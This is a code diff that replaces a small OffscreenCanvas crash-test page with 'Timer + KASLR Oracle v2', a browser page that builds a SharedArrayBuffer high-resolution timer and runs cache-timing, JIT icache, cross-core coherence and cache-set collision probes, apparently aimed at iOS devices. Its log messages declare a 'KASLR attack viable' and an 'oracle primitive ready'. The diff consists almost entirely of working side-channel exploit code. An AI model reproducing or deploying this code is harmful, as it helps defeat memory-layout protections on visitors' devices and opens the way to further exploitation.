@@ -1,34 +1,470 @@
-<!doctype html><html><head>
-<meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1">
-<title>P10 isolated</title>
-<style>body{background:#0a0a0a;color:#e4e4e4;font:13px monospace;padding:16px}
-#o{background:#111;border:1px solid #333;border-radius:8px;padding:14px;height:80vh;overflow-y:auto;white-space:pre-wrap;margin-top:10px}
-button{background:#ff453a;color:#fff;border:none;padding:12px 20px;border-radius:8px;cursor:pointer;margin:4px}
-.g{color:#32d74b}.d{color:#666}.r{color:#ff453a}
-</style></head><body>
-<button onclick="run(10)">▶ 10 iters</button>
-<button onclick="run(50)">▶ 50 iters</button>
-<button onclick="run(200)">▶ 200 iters</button>
-<div id="o"></div>
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Timer + KASLR Oracle v2</title></head>
+<body>
+<pre id="log"></pre>
 <script>
-function log(s,c){const d=document.getElementById('o'),e=document.createElement('span');if(c)e.className=c;e.textContent=s+'\n';d.appendChild(e);d.scrollTop=d.scrollHeight;}
-async function run(n){
-    document.getElementById('o').textContent='';
-    log('[*] P10 × '+n+' iters starting...','d');
-    for(let i=0;i<n;i++){
-        const canvases=[];
-        for(let k=0;k<100;k++){
-            const oc=new OffscreenCanvas(64,64);
-            oc.getContext('2d').fillRect(0,0,64,64);
-            canvases.push(oc);
-        }
-        canvases.splice(0,50);
-        for(const oc of canvases){
-            const bm=await oc.transferToImageBitmap();
-            bm.close();
-        }
-        log('[*] iter '+i+' done','d');
+// v2 — fixes T2/T5 zero-count problem:
+// counter ticks every ~3.87ns. A single array read is <3.87ns so delta=0.
+// Fix: batch N accesses between snapshots → accumulate ticks → real signal.
+// Strategy: BATCH=64 sequential reads, median the per-access time = delta/64.
+
+const LOG = document.getElementById('log');
+const log = s => { LOG.textContent += s + '\n'; console.log(s); };
+
+// ── SAB counter worker ──
+const COUNTER_WORKER_SRC = `
+  self.onmessage = function(e) {
+    if (e.data.cmd === 'start') {
+      const counter = new Int32Array(e.data.sab);
+      while (true) { Atomics.add(counter, 0, 1); }
     }
-    log('[+] Completed '+n+' iters — no crash','g');
+  };
+`;
+
+let counterWorker = null;
+let counterView = null;
+
+async function startCounter() {
+  const sab = new SharedArrayBuffer(4);
+  counterView = new Int32Array(sab);
+  const blob = new Blob([COUNTER_WORKER_SRC], {type:'application/javascript'});
+  counterWorker = new Worker(URL.createObjectURL(blob));
+  counterWorker.postMessage({cmd: 'start', sab});
+  await new Promise(r => setTimeout(r, 150)); // let worker pin to core
 }
-</script></body></html>
+
+const rdcnt = () => Atomics.load(counterView, 0);
+
+// ─────────────────────────────────────────────────────────────
+// T1: Calibrate
+// ─────────────────────────────────────────────────────────────
+async function t1() {
+  log('─── T1: SAB counter calibration ───');
+  const wallT0 = performance.now();
+  const cntT0 = rdcnt();
+  await new Promise(r => setTimeout(r, 20));
+  const cntT1 = rdcnt();
+  const wallT1 = performance.now();
+
+  const wallMs = wallT1 - wallT0;
+  const cntDelta = cntT1 - cntT0;
+  const nsPerUnit = (wallMs * 1e6) / cntDelta;
+
+  log(`[*] T1 rate: ${cntDelta} counts / ${wallMs.toFixed(2)}ms = ${nsPerUnit.toFixed(3)}ns/count`);
+
+  // Batch overhead: how many counter ticks for 64 back-to-back rdcnt()?
+  const overhead64 = (() => {
+    const t0 = rdcnt();
+    let x = 0;
+    for (let i = 0; i < 64; i++) x += rdcnt();
+    const t1 = rdcnt();
+    return (t1 - t0) - x * 0; // prevent DCE
+  })();
+  log(`[*] T1 64x rdcnt overhead: ~${overhead64} counts = ${(overhead64*nsPerUnit).toFixed(0)}ns`);
+  log(`[*] T1 ns/count: ${nsPerUnit.toFixed(3)}`);
+
+  if (nsPerUnit < 10) log(`[!!!] T1 SUB-10ns resolution — elite timer`);
+  else if (nsPerUnit < 100) log(`[!!!] T1 SUB-100ns resolution — sufficient for cache timing`);
+
+  return nsPerUnit;
+}
+
+// ─────────────────────────────────────────────────────────────
+// T2: Cache hit vs miss — BATCHED version
+// Read BATCH lines between snapshots → accumulate ticks → divide
+// ─────────────────────────────────────────────────────────────
+async function t2(nsPerUnit) {
+  log('─── T2: Cache hit/miss timing (batched) ───');
+
+  const STRIDE = 64;          // cache line size on A16
+  const BATCH  = 128;         // accesses per timing window
+  const SETS   = 16;          // how many hot lines to cycle through
+  const buf = new Uint8Array(STRIDE * 4096); // 256KB — fits in L2
+
+  // ── Warm SETS lines ──
+  for (let i = 0; i < SETS; i++) buf[i * STRIDE] = 1;
+
+  // Measure HIT: tight loop over hot lines, batch 128 accesses
+  const hitTimes = [];
+  for (let rep = 0; rep < 200; rep++) {
+    const t0 = rdcnt();
+    let x = 0;
+    for (let b = 0; b < BATCH; b++) x += buf[(b % SETS) * STRIDE];
+    const t1 = rdcnt();
+    hitTimes.push((t1 - t0 + (x & 0)) / BATCH); // per-access cost
+  }
+
+  // Evict: sweep 16MB
+  const evict = new Uint8Array(16 * 1024 * 1024);
+  let s = 0;
+  for (let i = 0; i < evict.length; i += STRIDE) s += evict[i];
+  buf[0] ^= s & 0;
+
+  // Small delay to let prefetcher settle
+  await new Promise(r => setTimeout(r, 10));
+
+  // Measure MISS: same lines but cold after evict
+  const missTimes = [];
+  for (let rep = 0; rep < 200; rep++) {
+    // Re-evict each rep to keep lines cold
+    const evict2 = new Uint8Array(16 * 1024 * 1024);
+    let s2 = 0; for (let i = 0; i < evict2.length; i += STRIDE) s2 += evict2[i];
+    buf[0] ^= s2 & 0;
+
+    const t0 = rdcnt();
+    let x = 0;
+    for (let b = 0; b < BATCH; b++) x += buf[(b % SETS) * STRIDE];
+    const t1 = rdcnt();
+    missTimes.push((t1 - t0 + (x & 0)) / BATCH);
+  }
+
+  hitTimes.sort((a,b)=>a-b);
+  missTimes.sort((a,b)=>a-b);
+
+  // Use percentile 25 to avoid outliers
+  const hitP25  = hitTimes[50];
+  const missP25 = missTimes[50];
+  const hitNs  = hitP25  * nsPerUnit;
+  const missNs = missP25 * nsPerUnit;
+  const ratio = hitNs > 0 ? missNs / hitNs : 0;
+
+  log(`[*] T2 cache HIT  p50: ${hitP25.toFixed(2)} counts = ${hitNs.toFixed(1)}ns per access`);
+  log(`[*] T2 cache MISS p50: ${missP25.toFixed(2)} counts = ${missNs.toFixed(1)}ns per access`);
+  log(`[*] T2 miss/hit ratio: ${ratio.toFixed(2)}x`);
+
+  // Print distribution (10 percentiles)
+  const pctHit  = [0,10,25,50,75,90,99].map(p => hitTimes[Math.floor(p/100*hitTimes.length)]);
+  const pctMiss = [0,10,25,50,75,90,99].map(p => missTimes[Math.floor(p/100*missTimes.length)]);
+  log(`[*] T2 HIT  distribution (p0/10/25/50/75/90/99): ${pctHit.map(v=>(v*nsPerUnit).toFixed(1)).join(' ')} ns`);
+  log(`[*] T2 MISS distribution (p0/10/25/50/75/90/99): ${pctMiss.map(v=>(v*nsPerUnit).toFixed(1)).join(' ')} ns`);
+
+  if (ratio >= 3) {
+    log(`[!!!] T2 STRONG hit/miss signal: ${ratio.toFixed(1)}x — cache-timing KASLR attack viable`);
+  } else if (ratio >= 1.5) {
+    log(`[*] T2 weak signal: ${ratio.toFixed(1)}x — averaging may help`);
+  } else {
+    log(`[*] T2 no signal: ${ratio.toFixed(1)}x — timer or eviction not effective`);
+  }
+
+  return { hitNs, missNs, ratio, hasSignal: ratio >= 1.5 };
+}
+
+// ─────────────────────────────────────────────────────────────
+// T3: Wasm JIT icache timing — BATCHED
+// ─────────────────────────────────────────────────────────────
+async function t3(nsPerUnit, hasSignal) {
+  log('─── T3: Wasm JIT timing (batched) ───');
+  if (!hasSignal) { log('[*] T3: skip (no cache signal from T2)'); return; }
+
+  const makeWasmBytes = (seed) => new Uint8Array([
+    0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
+    0x01,0x06,0x01,0x60,0x01,0x7f,0x01,0x7f,
+    0x03,0x02,0x01,0x00,
+    0x07,0x08,0x01,0x04,0x63,0x61,0x6c,0x6c,0x00,0x00,
+    0x0a,0x10,0x01,0x0e,0x00,
+    0x20,0x00,0x45,0x04,0x7f,0x41,seed&0xff,
+    0x05,0x20,0x00,0x41,0x01,0x6b,0x10,0x00,0x41,0x01,0x6a,
+    0x0b,0x0b,
+  ]);
+
+  const N = 16;
+  const fns = [];
+  for (let i = 0; i < N; i++) {
+    try {
+      const inst = await WebAssembly.instantiate(makeWasmBytes(i));
+      fns.push(inst.instance.exports.call);
+    } catch(e) { log(`[*] T3 compile ${i}: ${e.message}`); }
+  }
+  log(`[*] T3 compiled ${fns.length}/${N}`);
+  if (!fns.length) return;
+
+  // Warmup
+  for (const fn of fns) fn(5);
+
+  const BATCH = 32; // calls per timing window
+
+  // Evict
+  const evict = new Uint8Array(16*1024*1024);
+  let s=0; for (let i=0;i<evict.length;i+=64) s+=evict[i]; evict[0]^=s&0;
+  await new Promise(r=>setTimeout(r,10));
+
+  // Cold times (batched)
+  const coldTimes = fns.map(fn => {
+    const t0 = rdcnt();
+    let x = 0;
+    for (let b = 0; b < BATCH; b++) x += fn(5);
+    return (rdcnt() - t0 + (x & 0)) / BATCH;
+  });
+
+  // Hot times (same fns, still in icache)
+  const hotTimes = fns.map(fn => {
+    const t0 = rdcnt();
+    let x = 0;
+    for (let b = 0; b < BATCH; b++) x += fn(5);
+    return (rdcnt() - t0 + (x & 0)) / BATCH;
+  });
+
+  const coldNs = coldTimes.map(t=>t*nsPerUnit);
+  const hotNs  = hotTimes.map(t=>t*nsPerUnit);
+  const coldAvg = coldNs.reduce((a,b)=>a+b)/coldNs.length;
+  const hotAvg  = hotNs.reduce((a,b)=>a+b)/hotNs.length;
+  const ratio = coldAvg / Math.max(hotAvg, 0.1);
+
+  log(`[*] T3 cold avg=${coldAvg.toFixed(0)}ns  hot avg=${hotAvg.toFixed(0)}ns  ratio=${ratio.toFixed(2)}x`);
+  log(`[*] T3 cold per-fn: ${coldNs.map(n=>n.toFixed(0)).join(' ')}`);
+  log(`[*] T3 hot  per-fn: ${hotNs.map(n=>n.toFixed(0)).join(' ')}`);
+
+  if (ratio >= 2) {
+    log(`[!!!] T3 JIT icache timing signal: ${ratio.toFixed(1)}x → locate JIT pages → KASLR defeat`);
+  }
+}
+
+// ─────────────────────────────────────────────────────────────
+// T4: Flush+Reload via WebAssembly.Memory shared buffer
+// Two workers share a SAB. Worker A writes, B reads.
+// Race window: measure cross-core cache coherence latency.
+// Also confirms: detach on grow = true on iOS 26.
+// ─────────────────────────────────────────────────────────────
+async function t4(nsPerUnit) {
+  log('─── T4: Wasm Memory grow + cross-core coherence ───');
+
+  // Detach test
+  const mem = new WebAssembly.Memory({ initial: 1, maximum: 64 });
+  const viewBefore = new Uint8Array(mem.buffer);
+  const bufBefore  = mem.buffer;
+  viewBefore[65535] = 0xAB;
+  mem.grow(1);
+  const detached = bufBefore.byteLength === 0;
+  log(`[*] T4 grow detaches old buffer: ${detached}`);
+  if (detached) log(`[*] T4 standard spec behavior — no UAF here`);
+
+  // Flush+Reload via SAB: time how long a written byte becomes visible
+  // to main thread after worker writes it
+  const sab2 = new SharedArrayBuffer(64 * 1024); // 64KB
+  const sabView = new Int32Array(sab2);
+
+  const COHERE_WORKER = `
+    self.onmessage = function(e) {
+      const v = new Int32Array(e.data.sab);
+      const idx = e.data.idx;
+      // Spin until notified
+      Atomics.wait(v, 0, 0);
+      // Write to probe cell
+      Atomics.store(v, idx, 0xDEAD);
+    };
+  `;
+
+  const blobC = new Blob([COHERE_WORKER], {type:'application/javascript'});
+  const wC = new Worker(URL.createObjectURL(blobC));
+  wC.postMessage({ sab: sab2, idx: 16 });
+  await new Promise(r => setTimeout(r, 50));
+
+  // Signal worker + time until cell becomes visible
+  const t0 = rdcnt();
+  Atomics.store(sabView, 0, 1); // wake worker
+  Atomics.notify(sabView, 0, 1);
+
+  // Spin-wait for cell to be set
+  let spins = 0;
+  while (Atomics.load(sabView, 16) !== 0xDEAD && spins < 10000000) spins++;
+  const t1 = rdcnt();
+
+  const visibleNs = (t1 - t0) * nsPerUnit;
+  log(`[*] T4 cross-core write visibility: ${visibleNs.toFixed(0)}ns (${spins} spins)`);
+  if (visibleNs < 1000) log(`[!!!] T4 <1µs cross-core coherence — SAB write timing oracle is tight`);
+  else log(`[*] T4 ${visibleNs.toFixed(0)}ns cross-core latency`);
+
+  wC.terminate();
+}
+
+// ─────────────────────────────────────────────────────────────
+// T5: Page timing histogram — FIXED (exclude page 0 first-touch)
+// ─────────────────────────────────────────────────────────────
+async function t5(nsPerUnit) {
+  log('─── T5: Page timing histogram (fixed) ───');
+
+  const PAGE_SIZE = 4096;
+  const PAGES = 256; // 1MB total
+  const STRIDE = 64; // cache line
+  const probeArray = new Uint8Array(PAGE_SIZE * PAGES);
+
+  // Pre-touch ALL pages to eliminate first-touch fault noise
+  for (let i = 0; i < PAGES; i++) {
+    for (let j = 0; j < PAGE_SIZE; j += STRIDE) probeArray[i*PAGE_SIZE+j] = 1;
+  }
+  // Touch again (second pass = TLB warmed)
+  for (let i = 0; i < PAGES; i++) probeArray[i*PAGE_SIZE] = 1;
+
+  await new Promise(r => setTimeout(r, 20)); // settle
+
+  const REPS = 10;
+  const BATCH_PER_PAGE = 8; // 8 accesses within each page per timing window
+  const pageTimings = new Array(PAGES).fill(0).map(() => []);
+
+  for (let rep = 0; rep < REPS; rep++) {
+    // Full eviction
+    const evict = new Uint8Array(16 * 1024 * 1024);
+    let s = 0; for (let i = 0; i < evict.length; i += STRIDE) s += evict[i];
+    probeArray[0] ^= s & 0;
+
+    // Access each page with BATCH_PER_PAGE reads per timing window
+    for (let p = 0; p < PAGES; p++) {
+      const base = p * PAGE_SIZE;
+      const t0 = rdcnt();
+      let x = 0;
+      for (let b = 0; b < BATCH_PER_PAGE; b++) x += probeArray[base + (b*STRIDE) % PAGE_SIZE];
+      const t1 = rdcnt();
+      pageTimings[p].push((t1 - t0 + (x&0)) / BATCH_PER_PAGE);
+    }
+  }
+
+  // Compute medians
+  const medians = pageTimings.map(ts => {
+    ts.sort((a,b)=>a-b);
+    return ts[Math.floor(ts.length/2)];
+  });
+
+  // Exclude page 0 (first-touch anomaly) from stats
+  const statsMedians = medians.slice(1);
+  statsMedians.sort((a,b)=>a-b);
+  const globalMedian = statsMedians[Math.floor(statsMedians.length/2)];
+  const threshold = globalMedian * 3;
+
+  log(`[*] T5 global median (excl p0): ${(globalMedian*nsPerUnit).toFixed(2)}ns/access`);
+  log(`[*] T5 threshold 3x: ${(threshold*nsPerUnit).toFixed(2)}ns`);
+
+  // Anomalous pages (exclude p0 from list)
+  const slow = medians
+    .map((m,i)=>({p:i,ns:m*nsPerUnit}))
+    .slice(1) // skip page 0
+    .filter(({ns})=>ns > threshold*nsPerUnit);
+
+  log(`[*] T5 anomalous pages (>${(threshold*nsPerUnit).toFixed(2)}ns): ${slow.length}`);
+
+  if (slow.length > 0 && slow.length < PAGES * 0.05) {
+    log(`[!!!] T5 CACHE BOUNDARY ORACLE: ${slow.length} anomalous pages detected:`);
+    slow.slice(0,10).forEach(({p,ns}) =>
+      log(`[!!!] T5   page ${p} offset=0x${(p*PAGE_SIZE).toString(16).padStart(5,'0')}: ${ns.toFixed(1)}ns`)
+    );
+  } else if (slow.length === 0) {
+    log(`[*] T5 no anomalies — eviction working, uniform timing`);
+
+    // Print percentile spread to verify timer is working
+    const pcts = [0,25,50,75,90,99].map(p => statsMedians[Math.floor(p/100*statsMedians.length)]*nsPerUnit);
+    log(`[*] T5 timing spread (p0/25/50/75/90/99): ${pcts.map(n=>n.toFixed(2)).join(' ')} ns`);
+  } else {
+    log(`[*] T5 ${slow.length} slow pages — too many, likely eviction noise`);
+  }
+}
+
+// ─────────────────────────────────────────────────────────────
+// T6: NEW — Spectre-style cross-page Flush+Reload via SAB
+// Probe whether two JS allocations share a cache set
+// by timing collision via the SAB counter.
+// ─────────────────────────────────────────────────────────────
+async function t6(nsPerUnit) {
+  log('─── T6: Cross-page cache set collision probe ───');
+
+  // A16 L1: 64B lines, likely 4-way, 256 sets → index = VA[13:6]
+  // L2: 12MB, 8-way, many sets
+  // Two addresses alias L1 set if (addr_a ^ addr_b) & 0x3FC0 === 0
+  // i.e. they differ only in bits above bit 14 (the page offset bits are 0-11)
+
+  const BUF_SIZE = 4 * 1024 * 1024; // 4MB
+  const a = new Uint8Array(BUF_SIZE);
+  const b = new Uint8Array(BUF_SIZE);
+
+  // Pre-touch
+  for (let i = 0; i < BUF_SIZE; i += 64) { a[i]=1; b[i]=1; }
+  await new Promise(r => setTimeout(r, 10));
+
+  // Strategy: access a[0] to bring into cache.
+  // Then access b[offset] for various offsets.
+  // If a[0] and b[offset] share L1 set, accessing b evicts a → a becomes slow.
+  // We detect this by timing a[0] re-read.
+
+  const BATCH = 64;
+  const OFFSETS = [0, 0x4000, 0x8000, 0xC000, 0x10000, 0x14000, 0x18000, 0x1C000];
+  // 0x4000 = 16KB = one L1 set stride if index bits 13:6
+
+  const results = [];
+
+  for (const offset of OFFSETS) {
+    if (offset >= BUF_SIZE) continue;
+
+    // Evict both
+    const evict = new Uint8Array(8*1024*1024);
+    let s=0; for(let i=0;i<evict.length;i+=64) s+=evict[i]; a[0]^=s&0;
+
+    // Load a[0] into cache
+    let warm = 0;
+    for (let i = 0; i < BATCH; i++) warm += a[0];
+    a[0] ^= warm & 0;
+
+    // Access b[offset] — may evict a[0] if same cache set
+    let noise = 0;
+    for (let i = 0; i < BATCH; i++) noise += b[offset + (i*64 % 64)];
+    b[offset] ^= noise & 0;
+
+    // Re-time a[0]
+    const t0 = rdcnt();
+    let x = 0;
+    for (let i = 0; i < BATCH; i++) x += a[0];
+    const t1 = rdcnt();
+    const ns = (t1 - t0 + (x&0)) * nsPerUnit / BATCH;
+
+    results.push({ offset, ns });
+  }
+
+  log(`[*] T6 a[0] re-read timing after b[offset] access:`);
+  results.forEach(({offset, ns}) =>
+    log(`[*] T6   b[0x${offset.toString(16).padStart(5,'0')}] → a[0] = ${ns.toFixed(2)}ns`)
+  );
+
+  const baseline = results[0]?.ns || 0;
+  const collisions = results.filter(({ns}) => ns > baseline * 2);
+  if (collisions.length) {
+    log(`[!!!] T6 CACHE SET COLLISION at offsets: ${collisions.map(r=>`0x${r.offset.toString(16)}`).join(', ')}`);
+    log(`[!!!] T6 baseline=${baseline.toFixed(1)}ns, collision=${collisions.map(r=>r.ns.toFixed(1)).join(',')}ns`);
+    log(`[!!!] T6 This confirms L1 set index bits — KASLR oracle primitive ready`);
+  }
+}
+
+// ─────────────────────────────────────────────────────────────
+// MAIN
+// ─────────────────────────────────────────────────────────────
+(async () => {
+  log('// timer-kaslr-v2 ready');
+  log(`${new Date().toISOString().substr(11,12)} === STARTING ===`);
+
+  if (!self.SharedArrayBuffer) { log('[!] SAB unavailable'); return; }
+
+  await startCounter();
+
+  const nsPerUnit = await t1();
+  await new Promise(r=>setTimeout(r,50));
+
+  const t2res = await t2(nsPerUnit);
+  await new Promise(r=>setTimeout(r,50));
+
+  await t3(nsPerUnit, t2res.hasSignal);
+  await new Promise(r=>setTimeout(r,50));
+
+  await t4(nsPerUnit);
+  await new Promise(r=>setTimeout(r,50));
+
+  await t5(nsPerUnit);
+  await new Promise(r=>setTimeout(r,50));
+
+  await t6(nsPerUnit);
+
+  counterWorker.terminate();
+
+  const hits = LOG.textContent.split('\n').filter(l=>l.includes('[!!!]'));
+  log(`\n=== DONE — [!!!] hits: ${hits.length} ===`);
+  hits.forEach(h=>log(h));
+})();
+</script>
+</body>
+</html>
